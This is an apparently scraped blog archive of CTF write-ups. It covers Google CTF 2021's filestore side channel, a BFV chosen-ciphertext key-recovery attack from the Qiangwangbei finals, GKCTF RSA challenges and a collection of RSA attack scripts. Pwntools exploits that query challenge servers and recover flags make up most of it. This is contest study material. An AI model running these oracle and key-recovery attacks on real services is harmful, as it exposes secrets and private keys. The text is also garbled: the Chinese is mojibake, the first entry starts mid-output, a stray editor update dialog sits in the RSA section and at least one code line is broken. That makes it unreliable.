\u0026#39;CTF{CR1M3_0f_d3d0f_d3dup1ic4ti0n0f_d3dup1ic4ti0n0f_d3dup1ic4ti0n0f_d3dup1ic4ti0n0f_d2\u0026#39; ic| mome: 0.041, base: 0.036 b\u0026#39;\\nFiles: 4\\n\\nMenu:\\n- load\\n- store\\n- status\\n- exit\\n\u0026#39; b\u0026#39;Send me a line of data...\\n\u0026#39; b\u0026#34;Stored! Here\u0026#39;s your file id:\\n\u0026#34; b\u0026#39;a6m4SqnnLQPIYEIx\\n\u0026#39; b\u0026#39;\\nMenu:\\n- load\\n- store\\n- status\\n- exit\\n\u0026#39; ic| flag_: \u0026#39;CTF{CR1M3_0f_d3d0f_d3dup1ic4ti0n0f_d3dup1ic4ti0n0f_d3dup1ic4ti0n0f_d3dup1ic4ti0n0f_d3\u0026#39; ic| mome: 0.041, base: 0.041 [*] Closed connection to 0.0.0.0 port 10001 [â—] Opening connection to 0.0.0.0 on port 10001: Done Traceback (most recent call last): exp\nflag_len = 26 import io from pwn import * from string import printable from MyRE import CatData host = \u0026#39;filestore.2021.ctfcompetition.com\u0026#39; prot= 1337 # flag=\u0026#39;CTF{CR1M3_0f_d3dup1ic4ti0n}\u0026#39; flag =\u0026#39;CTF\u0026#39; tab = \u0026#39;`{|}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\u0026#34;#$%\u0026amp;\\\u0026#39;()*+,-./:;\u0026lt;=\u0026gt;?@[\\\\]^_`~ \\t\\n\\r\\x0b\\x0c\u0026#39; def getmome(): print(io.recvuntil(\u0026#39;exit\\n\u0026#39;)) io.sendline(\u0026#39;status\u0026#39;) buf = io.recvuntil(\u0026#39;/64.000kB\u0026#39;) mome = float(CatData(buf,\u0026#39;Quota: \u0026#39;,\u0026#39;kB\u0026#39;)[0]) return mome def sendpayload(flag_): print(io.recvuntil(\u0026#39;exit\\n\u0026#39;)) io.sendline(\u0026#39;store\u0026#39;) print(io.recvline()) io.sendline(flag_) print(io.recvline()) id = io.recvline() print(id) # flag1 = \u0026#39;CTF123123\u0026#39; for i in range(100): io = remote(host, prot) base = getmome() for ch in printable: flag_ = flag+ch sendpayload(flag_) mome = getmome() from icecream import * ic(flag_) ic(mome,base) if(mome\u0026gt;base): base = mome else: flag = flag +ch io.close() break # flag1 = \u0026#39;{CR1M3_0f_d3dup1ic4ti0n}\u0026#39; éªŒè¯å­åºåˆ—çš„åœ°æ–¹åˆä¸€ç‚¹é—®é¢˜ï¼Œéœ€è¦è‡ªè¡Œæˆªæ–­\n","date":"18 July 2021","permalink":"/achieve/ctf/google2021/","section":"archive","summary":"","title":"Google CTF 2021"},{"content":"\r2021ç¬¬äº”å±Šå¼ºç½‘æ¯ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ›å†³èµ›-crypto writeup # ç¬¬ä¸€æ¬¡æ‰“å¼ºç½‘æ¯ï¼Œä¸å«åº•å°±ç®—æˆåŠŸğŸ¼ğŸ¼ğŸ¼\nè›®æ¶å¿ƒçš„ï¼Œå·®ç‚¹å› ä¸ºæœåŠ¡å™¨å¤ªæ…¢å‡ºä¸æ¥\nfrom sage.stats.distributions.discrete_gaussian_integer import DiscreteGaussianDistributionIntegerSampler from random import randint, getrandbits from secret import flag import sys import signal q = 2 ^ 54 t = 83 T = 3 d = 1024 delta = int(q / t) sigma = 2 P.\u0026lt;x\u0026gt; = PolynomialRing(ZZ) f = x ^ d + 1 R.\u0026lt;X\u0026gt; = P.quotient(f) D = DiscreteGaussianDistributionIntegerSampler(sigma=sigma) def sample1(): return R([D() for _ in range(d)]) def sample2(): return R([randint(0, q - 1) for _ in range(d)]) def sample3(x): return [randint(0, T - 1) for _ in range(x)] def Roundq(a): A = a.list() for i in range(len(A)): A[i] = A[i] % q if A[i] \u0026gt; (q / 2): A[i] = A[i] - q return R(A) def Roundt(a): A = a.list() for i in range(len(A)): A[i] = A[i] % t if A[i] \u0026gt; (t / 2): A[i] = A[i] - t return R(A) def keygen(): s = sample1() a = Roundq(sample2()) e = Roundq(sample1()) pk = [Roundq(-(a * s + e)), a] return s, pk def encrypt(m): u = sample1() e1 = sample1() e2 = sample1() return (Roundq(pk[0] * u + e1 + delta * m), Roundq(pk[1] * u + e2)) def baseT(n, b=T): v = [] while True: x = n // b y = n % b v.append(y) if x == 0: break n = x v.reverse() return v def mutual(k, c, s): tmp = t * Roundq(c[0] + c[1] * s) TMP = tmp.list() for i in range(len(TMP)): TMP[i] = round(TMP[i] / q) tmp2 = Roundt(R(TMP)) if tmp2[min(k, d)] == 0: print(True) else: print(False) signal.alarm(1024) sk, pk = keygen() print(f\u0026#34;public key:{pk[0].list()}, {pk[1].list()}\u0026#34;) namelist = [\u0026#34;admin\u0026#34;, \u0026#34;Adam\u0026#34;, \u0026#34;Bruce\u0026#34;, \u0026#34;Chris\u0026#34;, \u0026#34;David\u0026#34;] users = dict() for i in namelist: users[i] = getrandbits(32) menu = \u0026#39;\u0026#39;\u0026#39; 1.Add friends 2.find friends 3.Send Message 4.Regist\u0026#39;\u0026#39;\u0026#39; friends = set() while 1: print(f\u0026#34;Current number of users: {len(users)}\u0026#34;) print(menu) op = int(input(\u0026#34;\u0026gt;\u0026#34;).strip()) if op == 1: name = input(\u0026#34;name:\u0026#34;).strip() id_num = int(input(\u0026#34;id:\u0026#34;).strip()) if name in users.keys(): if id_num == users[name]: friends.add(name) else: print(\u0026#34;failed\u0026#34;) else: print(\u0026#34;failed\u0026#34;) elif op == 2: op2 = input(\u0026#34;recv ct?(Y/N)\u0026#34;).strip() if op2.upper() == \u0026#34;Y\u0026#34;: for name in users.keys(): id_num = users[name] x = baseT(id_num) y = x + sample3(d - len(x)) ct = encrypt(R(y)) print(ct[0].list(), ct[1].list()) op3 = input(\u0026#34;continue?(Y/N)\u0026#34;) if op3.upper() == \u0026#34;N\u0026#34;: break elif op3.upper() != \u0026#34;Y\u0026#34;: sys.exit(1) elif op2.upper() != \u0026#34;N\u0026#34;: sys.exit(1) for i in range(len(users)): c1 = input(\u0026#34;c1:\u0026#34;).strip().split(\u0026#34; \u0026#34;) c2 = input(\u0026#34;c2:\u0026#34;).strip().split(\u0026#34; \u0026#34;) cc1 = list(map(int, c1)) cc2 = list(map(int, c2)) mutual(i, [R(cc1), R(cc2)], sk) elif op == 3: name = input(\u0026#34;name:\u0026#34;).strip() message = input(\u0026#34;message:\u0026#34;).strip() if name not in friends: print(\u0026#34;failed\u0026#34;) else: if name == \u0026#34;admin\u0026#34;: if message == \u0026#34;give me the flag\u0026#34;: print(flag) else: print(f\u0026#34;send \u0026#39;{message}\u0026#39; to {name}\u0026#34;) elif op == 4: name = input(\u0026#34;name:\u0026#34;).strip() if name not in users.keys(): users[name] = getrandbits(32) print(\u0026#34;succeeded\u0026#34;) else: print(\u0026#34;failed\u0026#34;) else: sys.exit(1) åˆ†æ # éœ€è¦æˆ‘ä»¬æ³„éœ²adminçš„idæ¥æ·»åŠ ä¸€ä¸ªfriendæ¥get massage\nè¿™ä¸ªé¢˜æ˜¯ä¸€ä¸ªç»å…¸çš„ CCA attack on FPSI\né’ˆå¯¹å…¨åŒæ€çš„ä¸€ä¸ªæ”»å‡»ï¼Œä½†å’Œå¸¸è§„æƒ…å†µä¸åŒçš„æ˜¯åœ¨ç”Ÿæˆå¯†é’¥æ—¶å¹¶æœªåƒæ ‡å‡†åŠ å¯†ç³»ç»Ÿä¸­ä¸ºäº†æ–¹ä¾¿ç¡¬ä»¶è¿ç®—ä½¿ç”¨0 1åºåˆ—ç”Ÿæˆçš„å¤šé¡¹å¼\nè€Œæ˜¯ä½¿ç”¨ [-7,-6, -5, -4, -3, -2, -1, 0, 1, 2, 3, 4, 5, 6,7] å¾—åºåˆ—éšæœºç”Ÿæˆçš„ç§é’¥\nfrom sage.stats.distributions.discrete_gaussian_integer import DiscreteGaussianDistributionIntegerSampler D = DiscreteGaussianDistributionIntegerSampler(sigma=sigma) def sample_2(): return R([randint(0,1) for _ in range(d)]) def sample1(): return R([D() for _ in range(d)]) def keygen(): s = sample1() a = Roundq(sample2()) e = Roundq(sample1()) pk = [Roundq(-(a * s + e)), a] return s, pk åŸç‰ˆpayloadåªéœ€è¦ç»™$t_i=m$\nå¯ä»¥æ¢å¤å‡ºå¯†é’¥\npayload:\nM=delta//4+50 Recoverd_key=[] for i in range(d): Recoverd_key.append(recover_key(i)) def recover_key(i): t1=[0 for _ in range(d)] t1[i]=M t2=M cc0=pk[0]+R(t1) cc1=pk[1]+R(t2) ans = decrypt([cc0,cc1]).list() return ans[i] ä½†é¢˜ç›®æƒ…å†µå¯†é’¥å¹¶ä¸ä¸º0 1 åºåˆ—è€Œä¸”Oracle attackåªèƒ½åˆ¤æ–­ä¸ºè¯¥ä½ä¸Šæ•°å­—æ˜¯å¦ä¸º0\nåœ¨æ”¹å˜t1[i]=M Mçš„ä¸ªæ•°åå‘ç°ä»¥ä¸‹æ€§è´¨ï¼š\nç§é’¥\\ è¿”å›çš„æ•°æ® M 2M 7M 5M 7 2 2 3 0 6 2 2 3 0 5 2 2 3 0 4 1 2 3 0 3 1 1 3 -1 2 1 1 2 -1 1 1 1 2 -1 0 0 1 2 -1 -1 0 0 2 -2 -2 0 0 1 -2 -3 -1 0 1 -2 -4 -1 -1 1 -2 -5 -1 -1 1 -3 -6 -1 -1 0 -3 -7 -1 -1 0 -3 åªè¦æŒ‰é¡ºåº n = [8,7, 6, 5, 4, 3, 2, 1, 0, -1, -2, -3, -4, -5,-4] t1 = n*M å°±å¯ä»¥å¯¹å¯†é’¥è¿›è¡Œä¸€ä¸ªpadding Oracle\nexp # from pwn import * # from icecream import * from tqdm import tqdm from time import * p1 = time() # ----------------------------------- # get pk # io = remote(\u0026#39;0.0.0.0\u0026#39;,10001) io = remote(\u0026#39;172.20.5.23\u0026#39;,8001) q = 2 ^ 54 t = 83 T = 3 d = 1024 delta = int(q / t) sigma = 2 P.\u0026lt;x\u0026gt; = PolynomialRing(ZZ) f = x ^ d + 1 R.\u0026lt;X\u0026gt; = P.quotient(f) def Roundt(a): A = a.list() for i in range(len(A)): A[i] = A[i] % t if A[i] \u0026gt; (t / 2): A[i] = A[i] - t return R(A) def Roundq(a): A = a.list() for i in range(len(A)): A[i] = A[i] % q if A[i] \u0026gt; (q / 2): A[i] = A[i] - q return R(A) def mutual2(k, c, s): tmp = t * Roundq(c[0] + c[1] * s) TMP = tmp.list() for i in range(len(TMP)): TMP[i] = round(TMP[i] / q) tmp2 = Roundt(R(TMP)) return tmp2 io.recvuntil(\u0026#39;public key:[\u0026#39;) pk1 = io.recvuntil(\u0026#39;]\u0026#39;)[:-1] io.recvuntil(\u0026#39;[\u0026#39;) pk2 = io.recvuntil(\u0026#39;]\u0026#39;)[:-1] # print(pk1) # print(pk2[:100]) pk2 = [int(i) for i in pk2.split(b\u0026#39;,\u0026#39;)] # print(pk2[:10]) pk1 = [int(i) for i in pk1.split(b\u0026#39;,\u0026#39;)] pk=[R(pk1),R(pk2)] for i in range(1024-5): print(io.recvuntil(\u0026#39;\u0026gt;\u0026#39;)) io.sendline(\u0026#39;4\u0026#39;) io.sendline(str(i)) M=delta//4+50 padding = [8,7, 6, 5, 4, 3, 2, 1, 0, -1, -2, -3, -4, -5,-4] sks= [-7,-6, -5, -4, -3, -2, -1, 0, 1, 2, 3, 4, 5, 6,7] rk=[100 for i in range(1024)] for x in range(len(sks)): print(io.recvuntil(\u0026#39;\u0026gt;\u0026#39;)) io.sendline(\u0026#39;2\u0026#39;) print(io.recvuntil(\u0026#39;recv ct?(Y/N)\u0026#39;)) io.sendline(\u0026#39;Y\u0026#39;) sleep(1) print(io.recvuntil(\u0026#39;[\u0026#39;)) adminC1 = io.recvuntil(\u0026#39;]\u0026#39;)[:-1] print((io.recvuntil(\u0026#39;[\u0026#39;))) adminC2 = io.recvuntil(\u0026#39;]\u0026#39;)[:-1] adminC1 = [int(i) for i in adminC1.split(b\u0026#39;,\u0026#39;)] # print(pk2[:10]) adminC2 = [int(i) for i in adminC2.split(b\u0026#39;,\u0026#39;)] print(io.recvuntil(\u0026#39;continue?(Y/N)\u0026#39;)) io.sendline(\u0026#39;N\u0026#39;) pad = padding[x] print(f\u0026#39;ç¬¬{x}ä¸ªäº†\u0026#39;) for k in tqdm(range(1024)): t1=[0 for _ in range(d)] t1[k]=pad*M t2=M # ================================ cc0=(pk[0]+R(t1)).list() payload_c1 = \u0026#39;\u0026#39; for i in cc0: payload_c1 += str(i) payload_c1+=\u0026#39; \u0026#39; payload_c2 = \u0026#39;\u0026#39; cc1=(pk[1]+R(t2)).list() for i in cc1: payload_c2 += str(i) payload_c2+=\u0026#39; \u0026#39; io.recvuntil(\u0026#39;c1:\u0026#39;) io.sendline(payload_c1) # sleep(1) io.recvuntil(\u0026#39;c2:\u0026#39;) io.sendline(payload_c2) # ===================================== fb = io.recvline() if(b\u0026#39;True\u0026#39; in fb and rk[k]==100): rk[k] = sks[x] # input() for i in range(len(rk)): if(rk[i]==100): rk[i]=7 sk = R(rk) adminCT=[R(adminC1),R(adminC2)] # cc0=R(ct[0].list()) # cc1=R(ct[1].list()) ans = mutual2(0,adminCT,sk) x = ans.list()[:25] admin_id =0 use=[] ids=[] for i in x: admin_id *= T admin_id += i use.append(i) ids.append(admin_id) print(rk) print(ids) # io.interactive() sleep(1) for id in ids: print(io.recvuntil(\u0026#39;\u0026gt;\u0026#39;)) io.sendline(\u0026#39;1\u0026#39;) print(io.recvuntil(\u0026#39;name:\u0026#39;)) io.sendline(\u0026#39;admin\u0026#39;) print(io.recvuntil(\u0026#39;id:\u0026#39;)) io.sendline(str(id)) print(io.recvline()) print(io.recvuntil(\u0026#39;\u0026gt;\u0026#39;)) io.sendline(\u0026#39;3\u0026#39;) io.sendlineafter(\u0026#39;name:\u0026#39;,\u0026#39;admin\u0026#39;) io.sendlineafter(\u0026#39;message:\u0026#39;,\u0026#39;give me the flag\u0026#39;) sleep(1) print(io.recv(2048)) p2 = time() print(p2-p1) FLAG\nb\u0026#39;name:\u0026#39; b\u0026#39;id:\u0026#39; b\u0026#39;failed\\n\u0026#39; b\u0026#39;Current number of users: 1024\\n\\n1.Add friends\\n2.find friends\\n3.Send Message\\n4.Regist\\n\u0026gt;\u0026#39; b\u0026#39;name:\u0026#39; b\u0026#39;id:\u0026#39; b\u0026#39;failed\\n\u0026#39; b\u0026#39;Current number of users: 1024\\n\\n1.Add friends\\n2.find friends\\n3.Send Message\\n4.Regist\\n\u0026gt;\u0026#39; b\u0026#39;flag{CCA_attack_BFV_123698745}\\n\u0026#39; [*] Closed connection to 172.20.5.23 port 8001 /mnt/c/U/1/De/qwbå†³èµ›/bfv æœ‰ä¸ªå°åœ°æ–¹æ¯å¤„ç†å¥½ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆsk = 7ä¸èƒ½å®Œå…¨æ­£ç¡®çš„Oracleï¼Œåªèƒ½æ‰‹åŠ¨æ¢å¤äº†\næœåŠ¡å™¨OIé€Ÿåº¦åŠå…¶æ…¢ ç­‰äº†åŠå¤©æ‰æ‰“é€š\n","date":"11 July 2021","permalink":"/achieve/ctf/qwbs5wp/","section":"archive","summary":"","title":"Writeup for BFV in å¼ºç½‘æ¯S5 final"},{"content":"\rgkctf2021 6-25 # å¤ªèœäº†,åªåšäº†ä¸¤ä¸ªé¢˜,æ—¶é—´è¿˜ä¸å¤Ÿäº†å‘œå‘œ\npythonrandom é€šæ€è„šæœ¬ # from randcrack import RandCrack rc = RandCrack() for i in data: r = bin(int(i))[2:].zfill(64) r1 = r[:32] r2 = r[32:] rc.submit(int(r2, 2)) rc.submit(int(r1, 2)) tmp = rc.predict_getrandbits(64) rrrrsa # å°æ•°è®ºé¢˜\næ³¨æ„mod nå’Œmod qä¹‹é—´çš„å…³ç³»\nfrom libnum import * from Crypto.Util.number import * from icecream import * e = 65537 c=13492392717469817866883431475453770951837476241371989714683737558395769731416522300851917887957945766132864151382877462142018129852703437240533684604508379950293643294877725773675505912622208813435625177696614781601216465807569201380151669942605208425645258372134465547452376467465833013387018542999562042758 n1=75003557379080252219517825998990183226659117019770735080523409561757225883651040882547519748107588719498261922816865626714101556207649929655822889945870341168644508079317582220034374613066751916750036253423990673764234066999306874078424803774652754587494762629397701664706287999727238636073466137405374927829 c1=68111901092027813007099627893896838517426971082877204047110404787823279211508183783468891474661365139933325981191524511345219830693064573462115529345012970089065201176142417462299650761299758078141504126185921304526414911455395289228444974516503526507906721378965227166653195076209418852399008741560796631569 cc1=23552090716381769484990784116875558895715552896983313406764042416318710076256166472426553520240265023978449945974218435787929202289208329156594838420190890104226497263852461928474756025539394996288951828172126419569993301524866753797584032740426259804002564701319538183190684075289055345581960776903740881951 cc2=52723229698530767897979433914470831153268827008372307239630387100752226850798023362444499211944996778363894528759290565718266340188582253307004810850030833752132728256929572703630431232622151200855160886614350000115704689605102500273815157636476901150408355565958834764444192860513855376978491299658773170270 # hint1 = pow(2020 * p1 + q1, 202020, n1) # hint2 = pow(2021 * p1 + 212121, q1, n1) a = 2020 e1 = 202020 e2 = 212121 tmp = ((cc2-e2)*a*invmod(a+1,n1))%n1 tmp = pow(tmp,e1,n1)-cc1%n1 q1 = gcd(tmp,n1) p1 = n1//q1 ic(q1,n1%q1) phi1 = (p1-1)*(q1-1) d1 = invmod(e,phi1) P = pow(c1,d1,n1) a = 2020 e1 = 202020 e2 = 212121 t = e1*e2 n2=114535923043375970380117920548097404729043079895540320742847840364455024050473125998926311644172960176471193602850427607899191810616953021324742137492746159921284982146320175356395325890407704697018412456350862990849606200323084717352630282539156670636025924425865741196506478163922312894384285889848355244489 c2=67054203666901691181215262587447180910225473339143260100831118313521471029889304176235434129632237116993910316978096018724911531011857469325115308802162172965564951703583450817489247675458024801774590728726471567407812572210421642171456850352167810755440990035255967091145950569246426544351461548548423025004 cc1=25590923416756813543880554963887576960707333607377889401033718419301278802157204881039116350321872162118977797069089653428121479486603744700519830597186045931412652681572060953439655868476311798368015878628002547540835719870081007505735499581449077950263721606955524302365518362434928190394924399683131242077 cc2=104100726926923869566862741238876132366916970864374562947844669556403268955625670105641264367038885706425427864941392601593437305258297198111819227915453081797889565662276003122901139755153002219126366611021736066016741562232998047253335141676203376521742965365133597943669838076210444485458296240951668402513 f1 = cc2 *pow(a,e2,n2)*invmod(pow(a+1,e2,n2),n2)%n2 tmp = (pow(f1,e1,n2)-pow(cc1,e2,n2))%n2 q2 = gcd(tmp,n2) ic(q2,n2%q2) p2 = n2//q2 phi2 = (p2-1)*(q2-1) d2 = invmod(e,phi2) Q = pow(c2,d2,n2) e = 65537 c=13492392717469817866883431475453770951837476241371989714683737558395769731416522300851917887957945766132864151382877462142018129852703437240533684604508379950293643294877725773675505912622208813435625177696614781601216465807569201380151669942605208425645258372134465547452376467465833013387018542999562042758 p=P q=Q n=p*q phi = (p-1)*(q-1) d = invmod(e,phi) m = pow(c,d,n) print(long_to_bytes(m)) # GKCTF{f64310b5-d5e6-45cb-ae69-c86600cdf8d8} ","date":"10 July 2021","permalink":"/achieve/ctf/dozer2021/","section":"archive","summary":"gkctf2021 6-25 # å¤ªèœäº†,åªåšäº†ä¸¤ä¸ªé¢˜,æ—¶é—´è¿˜ä¸å¤Ÿäº†å‘œå‘œ","title":"Writeup for DozerCtf 2021"},{"content":" ä¸€äº›RSAåƒåœ¾é¢˜\nnormal # rsa1 p-q # p qç›¸å·®å¤ªå°,ç›´æ¥ç”¨è´¹é©¬æ–¹æ³•åˆ†è§£\nfrom Crypto.Util.number import * from gmpy2 import next_prime import random ## p = getPrime(512) ## q = next_prime(next_prime(p) + random.randint(2 ** 10, 2 ** 15)) ## q = p+a ## è´¹é©¬æ–¹æ³•åˆ†è§£n def fermat_factors(n): assert n % 2 != 0 import gmpy2 a = gmpy2.isqrt(n) b2 = gmpy2.square(a) - n while not gmpy2.is_square(b2): a += 1 b2 = gmpy2.square(a) - n factor1 = a + gmpy2.isqrt(b2) factor2 = a - gmpy2.isqrt(b2) return int(factor1), int(factor2) n = 58469790767119395443619182703965753536155769938155967209185013051235434307443199577853487462032941284716788878629026151008480533108948515487216969655522610052504252431114883354036178747396340974017983797943561003427523330887483816814526450542542017962396566419907954878575664402091503063651747784708370988551 e = 65537 c = 5210792629811531618748922441951091043558836768927486327066208193531783313814007532484357434613606536101786384803692759877417618085066111343186477103523861319942108843549903015256729449831006717779587476869110804323636543879652560144414279029912184440958215613248124698646241943161894215574508920550451749893 q, p = fermat_factors(n) d = inverse(e, (p - 1) * (q - 1)) print(long_to_bytes(pow(c, d, n))) flag b\u0026rsquo;flag{this_is_flag}'\nrsa4 ed2n # ç”¨ä»¥ä¸‹è„šæœ¬æ¥æ±‚qp\ndef getpq(n,e,d): while True: k = e * d - 1 g = random.randint(0, n) while k%2==0: k=k//2 temp=gmpy2.powmod(g,k,n)-1 if gmpy2.gcd(temp,n)\u0026gt;1 and temp!=0: return gmpy2.gcd(temp,n) rsa 5 EeE # å°å…¬é’¥åŠ å¯†ï¼Œå°è¯•é˜Ÿcç›´æ¥å¼€ä¸‰æ¬¡æ–¹\nc=74802199268289650659966949121722134398741724016029787984879330914681382911392412708797079066742193788624174545434065877798917466086322130161380099507267024211772226618358174709389234588799169125 import gmpy2 m = gmpy2.iroot(c,3) print(m) rsa7 Radin # ä½¿ç”¨pythonè„šæœ¬ ä»£ç ï¼š\nfrom Crypto.PublicKey import RSA rsakey = RSA.importKey(open(\u0026#34;public.key\u0026#34;, \u0026#34;r\u0026#34;).read()) n = rsakey.n e = rsakey.e print(,n,e) å¸¦ç§é’¥ç‰ˆæœ¬ï¼š\nrsakey = RSA.importKey(open(\u0026#34;prikey.key\u0026#34;, \u0026#34;r\u0026#34;).read()) n = rsakey.n e = rsakey.e d = rsakey.d q = rsakey.q p = rsakey.p print(e,d,n,p,q) Rabinç®—æ³•çš„è§£å¯†åŸç†æ˜¯ï¼šå‡è®¾æˆ‘ä»¬çŸ¥é“m%p å’Œ m%qï¼Œé‚£ä¹ˆæ‹¿ç€ä¸­å›½å‰©ä½™å®šç†ç«‹åˆ»å¯ä»¥çŸ¥é“ m%nçš„å€¼ã€‚åˆæœ‰m\u0026lt;nï¼Œåˆ™mçš„å€¼å°±ç›´æ¥æ‹¿åˆ°äº†ï¼Œå²‚ä¸ç¾å“‰ï¼Ÿ\nå®é™…ä¸Šæ ‡å‡†çš„Rabinç®—æ³•çš„è§£å¯†ä¼šå¾—åˆ°å››ä¸ªç»“æœã€‚æˆ‘ä»¬ä¸€ä¸€å¯¹æ¯”å°±å¯ä»¥æ‰¾åˆ°flag\nä¸“é—¨ç”¨äºè§£radinçš„è„šæœ¬ï¼š\nfrom Crypto.Util.number import * def squareMod(c, mod): ## æ¨¡æ„ä¹‰ä¸‹å¼€æ ¹ï¼Œæ‰¾åˆ° x, ä½¿å¾— x^2 % mod = c assert(mod % 4 == 3) res = gmpy2.powmod(c, (mod+1)//4, mod) return res, mod - res def getPlaintext(x, y, p, q): ## å‡è®¾ m%p=x, m%q=y, æ±‚æ˜æ–‡ res = x*q*gmpy2.invert(q, p) + y*p*gmpy2.invert(p, q) return res % (p*q) def solve(c, p, q): ## å·²çŸ¥ p,q, è§£å¯† c px = squareMod(c, p) py = squareMod(c, q) for x in px: for y in py: yield getPlaintext(x, y, p, q) c = open(\u0026#39;flag.enc\u0026#39;, \u0026#39;rb\u0026#39;).read() ## print(c) c = int(c.hex() ,16) p = 275127860351348928173285174381581152299 q = 319576316814478949870590164193048041239 for msg in solve(c, p, q): print(long_to_bytes(msg)) RSA oracle # rsa10 nctf2020 # from Crypto.Util.number import getPrime, inverse, GCD, bytes_to_long # from secret import flag flag = b\u0026#39;flag{xxxxxxxxxxxxxxxxxx}\u0026#39; m = bytes_to_long(flag) while True: p = getPrime(512) q = getPrime(512) n = p * q e = getPrime(32) if GCD((p-1)*(q-1), e) == 1: d = inverse(e, (p-1)*(q-1)) break print(e, n, pow(m, e, n), sep=\u0026#39;\\n\u0026#39;) for _ in range(10000): cc = int(input(\u0026#34;\u0026gt; \u0026#34;)) mm = int.to_bytes(pow(cc, d, n), 1024//8, \u0026#39;big\u0026#39;) print(mm.startswith(b\u0026#34;\\x00\u0026#34;)) å…ˆç¡®å®šflagé•¿åº¦ï¼Œç”¨äºŒåˆ†æ³•æ— é™é€¼è¿‘flagçš„å€¼\nfrom pwn import * from Crypto.Util.number import * r = remote(\u0026#34;0.0.0.0\u0026#34;,10001) buf = r.recvline() e = int(buf.decode().strip()) n = int(r.recvline().decode().strip()) c = int(r.recvline().decode().strip()) max = 2**826 min = 2**822 while (max-min\u0026gt;1): mid = (max+min)//2 temp = (pow(mid,e,n)*c)%n r.sendline(str(temp)) data = r.recvline() print(data) ## data = r.recvline() if(b\u0026#39;True\u0026#39; in data): min = mid else: max = mid print(min,max) print(long_to_bytes(2**1016//min)) print(long_to_bytes(2**1016//max)) rsa æ ¼è§„çº¦æ”»å‡» # rsa 12 fac with hit # åˆ©ç”¨coppersmithè·å–p\nn = 0x5894f869d1aecee379e2cb60ff7314d18dbd383e0c9f32e7f7b4dc8bd47535d4f3512ce6a23b0251049346fede745d116ba8d27bcc4d7c18cfbd86c7d065841788fcd600d5b3ac5f6bb1e111f265994e550369ddd86e20f615606bf21169636d153b6dfee4472b5a3cb111d0779d02d9861cc724d389eb2c07a71a7b3941da7d p_fake = 0x5d33504b4e3bd2ffb628b5c447c4a7152a9f37dc4bcc8f376f64000fa96eb97c0af445e3b2c03926a4aa4542918c601000000000000000000000000000000000 pbits = p_fake.nbits() ##kbits = 900 kbits = 128 ##på¤±å»çš„ä½ä½ pbar = p_fake \u0026amp; (2^pbits-2^kbits) print \u0026#34;upper %d bits (of %d bits) is given\u0026#34; % (pbits-kbits, pbits) PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) f = x + pbar x0 = f.small_roots(X=2^kbits, beta=0.4)[0] ## find root \u0026lt; 2^kbits with factor \u0026gt;= n^0.3 p= x0 + pbar print p rsa13 bigger d # rsa14Partial Key # rsa 15 Wiener plas # rsa17 Linear math # ä¸€æ¬¡è®ºæ–‡æ”»å‡»æ–¹å¼å¤ç°\n[Window Title] Update Available [Main Instruction] A new version of Sublime Text is available, download now? [Download] [å–æ¶ˆ] from libnum.common import gcd from data import b,c from gmpy2 import * from Crypto.Util.number import * import time import libnum n = 110384114201475663616747380525627123445579689285630886040168434260829091685143698389730908307058264757595472490646553684116819186297946861038089011634839837455006286876809812362253126020273844190061817352704628672775002140119322152762726493845024580159588306209024297015077439731424454595795781027348887941827 a = 877 t = 541 e = 0x101 strat = time.time() Pk = [] for k in range(e): tot = 1 ## print(k) for k1 in range(e): if k!= k1 : ## print(gcd((b[k]-b[k1])%n,n)) tot *= libnum.invmod((b[k]-b[k1])%n,n) tot %= n tot %= n Pk.append(tot) v=0 for k in range(e): v += (pow(b[k],e,n)*Pk[k])%n v %= n tmp = 0 for k in range(e): tmp += (c[k]*Pk[k])%n tmp %=n x = ((libnum.invmod(e,n)*(tmp-v))%n)%n from Crypto.Util.number import * print(x*libnum.invmod(a,n)%n) end = time.time() print(end - strat) rsa21 half p # é¢˜ç›®ç»™å‡ºäº†dpå’Œä¸€å¯¹å…¬é’¥\nå·²çŸ¥\n$dp+k*(p-1)=d;mod;p-1$\n$ed=1=k*(p-1)(q-1)+1;mod;(p-1)(q-1)$\n$ed=e*dp;mod;p-1$\n$k_1*(p-1)(q-1)+1=k_2(p-1)+dpe$\nå¯å†™ä¸º\n$(p-1)=(dp*e-1)/x$\nç”±å¼å­å¯çŸ¥xå°äºeï¼Œè‹¥eè¾ƒå°ï¼Œå¯¹eéå†å°±å¯ä»¥å¾—åˆ°p q\nimport gmpy2 from Crypto.Util.number import bytes_to_long, long_to_bytes n = 82459095549748227929288050555498384469575272567666482697551651645093561076800636903414213079689167610546931321044499258842967876311854597995877424799325872420793993678223520863171113084551896184041824490162048421763392587578106892564418656377436734864113039255928135310184434095934015134373147964955532123881 dp = 2154496166987404807570061246274794378102105725450715702694091896971248930139905533434215910296644935717134018627774991211321921063947893592214392985692261 e = 65537 c = 31011021137992452431076840432639365407713019786586660934070807380893254876293446768579394082019427413952266893686196624551302747440454439484165217862543849146153312457417254751109386482402322429697563463538223851046832003654970628089968896006236813877570702218773093761582493452679741468626986210359922340714 for i in range(1, e): if (e * dp - 1) % i == 0: p = (e * dp - 1) // i + 1 if n % p == 0: q = n // p phin = (p - 1) * (q - 1) d = gmpy2.invert(e, phin) print(long_to_bytes(pow(c, d, n))) break rsa26 partial message # æ„é€ å¤šé¡¹å¼$f=ï¼ˆm+xï¼‰^3-c=0;mod;n$\ndef phase2(high_m, n, c): R.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n), implementation=\u0026#39;NTL\u0026#39;) m = high_m + x M = (m^3 - c).small_roots()[0] print(M) n = 13112061820685643239663831166928327119579425830632458568801544406506769461279590962772340249183569437559394200635526183698604582385769381159563710823689417274479549627596095398621182995891454516953722025068926293512505383125227579169778946631369961753587856344582257683672313230378603324005337788913902434023431887061454368566100747618582590270385918204656156089053519709536001906964008635708510672550219546894006091483520355436091053866312718431318498783637712773878423777467316605865516248176248780637132615807886272029843770186833425792049108187487338237850806203728217374848799250419859646871057096297020670904211 c = 15987554724003100295326076036413163634398600947695096857803937998969441763014731720375196104010794555868069024393647966040593258267888463732184495020709457560043050577198988363754703741636088089472488971050324654162166657678376557110492703712286306868843728466224887550827162442026262163340935333721705267432790268517 high_m = 0x464c41477b325e38727361373538393639336663363839633737633566353236326436000000000000000000 from Crypto.Util.number import * print(long_to_bytes(2519188594271759205757864486097605540135407501571078627238849443561219057751843170540261842677239681908736+phase2(high_m, n, c))) 